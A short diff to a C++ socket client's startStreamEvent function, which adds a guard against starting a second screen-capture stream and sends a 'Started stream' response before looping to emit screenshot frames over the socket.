@@ -150,19 +150,22 @@ namespace silence
                  SIOBOOL(true));
     }
 
-    void Client::startStreamEvent()
-    {
-        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
-        mStreamRunning = true;
-        lockGuard.unlock();
+    void Client::startStreamEvent() {
+      std::unique_lock<std::mutex> lockGuard(mStreamLocker);
+      if (mStreamRunning) {
+        error("start_stream", "Stream is running");
+        return;
+      }
+      mStreamRunning = true;
+      lockGuard.unlock();
 
-        impl::Screenshot screen;
-        while (true)
-        {
-            lockGuard.lock();
-            if (!mStreamRunning)
-                return;
-            lockGuard.unlock();
+      response("start_stream", SIOSTR("Started stream"));
+      impl::Screenshot screen;
+      while (true) {
+        lockGuard.lock();
+        if (!mStreamRunning)
+          return;
+        lockGuard.unlock();
 
             cv::Mat image{screen.take()};
             mSocket->emit("frame",
